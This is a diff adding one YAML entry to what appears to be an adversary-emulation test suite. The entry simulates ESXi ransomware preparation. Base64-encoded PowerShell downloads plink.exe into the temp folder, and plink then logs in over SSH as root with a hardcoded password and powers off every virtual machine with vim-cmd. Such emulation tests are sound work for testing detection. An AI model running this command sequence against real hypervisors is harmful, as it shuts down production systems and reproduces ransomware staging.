@@ -1,0 +1,18 @@
+- id: 2920724c-678a-56bf-bb80-b7098f246096
+  name: Soumaia ART Tests - ESXi - vim-cmd Used to Power Off VMs
+  description: 'Adversaries may power off VMs to facilitate the deployment of ransomware payloads.
+
+    [Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#power%20off%20vm)'
+  tactic: impact
+  technique:
+    attack_id: T1529
+    name: System Shutdown/Reboot
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABwAGwAaQBuAGsALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AdABoAGUALgBlAGEAcgB0AGgALgBsAGkALwB+AHMAZwB0AGEAdABoAGEAbQAvAHAAdQB0AHQAeQAvAGwAYQB0AGUAcwB0AC8AdwA2ADQALwBwAGwAaQBuAGsALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAHAAbABpAG4AawAuAGUAeABlACIACgA=
+          )
+          echo "" | "%TEMP%\ART-ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done"
